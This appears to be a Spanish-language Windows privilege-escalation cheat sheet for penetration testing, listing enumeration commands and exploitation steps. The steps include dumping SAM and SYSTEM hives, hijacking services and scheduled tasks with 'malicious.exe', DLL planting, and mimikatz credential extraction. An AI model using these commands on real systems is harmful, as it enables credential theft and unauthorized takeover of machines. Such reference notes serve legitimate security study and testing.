# Cheat Sheet: Escalación de Privilegios en Windows**

## 🔍 Sección 1: Enumeración

### 1. Información del sistema

```powershell
systeminfo
wmic os get Caption, Version, Architecture
whoami /priv
whoami /groups
```

### 2. Usuarios y grupos

```powershell
net user
net localgroup Administrators
quser
Get-LocalUser | Select Name,Enabled,LastLogon
Get-LocalGroupMember <group>

```

### 3. Permisos y archivos sensibles

```powershell
icacls C:\ruta\archivo
findstr /si password *.txt *.ini *.config
(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object {Get-ACL $_}
```

### 4. Procesos y tareas en ejecución

```powershell
tasklist /v
wmic process list full
Get-Process | Select-Object Name,Id,Path
```

### 5. Servicios y conexiones

```powershell
netstat -ano
sc query state= all
Get-Service | Select Name,StartType,Status
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} // ejemplo con mySQL
Get-ModifiableServiceFile // Servicios que el usuario puede modificar
```

### 6. Tareas programadas y servicios inseguros

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
```

### 7. Variables de entorno

```powershell
env | fl
(Get-Item Env:Path).Value -split ';'
```

### 8. Capacidades de binarios

```powershell
wmic path win32_service get Name,PathName,StartMode
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```

### 9. Control de acceso remoto

```powershell
qwinsta
query user
netsh advfirewall show currentprofile
```
### 10. Aplicaciones instaladas:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
### 11. Archivos de bases de datos y configuracion
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
### 12. Powershell info, history, user trace
```
Get-History
(Get-PSReadlineOption).HistorySavePath

```


## 💥 Sección 2: Explotación

### 1. Abuso de permisos en archivos y directorios

```powershell
icacls C:\ruta\archivo /grant Everyone:F
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

### 2. Tareas programadas y servicios inseguros

```powershell
schtasks /create /tn "MaliciousTask" /tr C:\malicious.exe /sc ONCE /st 00:00
sc config VulnService binPath= "C:\malicious.exe"
```

### 3. Uso de runas y bypass UAC

```powershell
runas /user:Administrador cmd.exe
Start-Process PowerShell -Verb RunAs
```

### 4. Explotación de servicios vulnerables

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "*unquoted path*"}
```

### 5. Abuso de binarios con permisos incorrectos

```powershell
wmic service where "PathName like '%inseguro%'" get Name,PathName
```

### 6. Inyección de DLL y ejecución maliciosa

```powershell
Copy-Item .\malicious.dll "C:\Program Files\VulnerableApp\malicious.dll"
```

### 7. Credenciales en memoria

```powershell
mimikatz.exe
sekurlsa::logonpasswords
```

### 8. Kernel Exploits

```powershell
whoami /priv
```
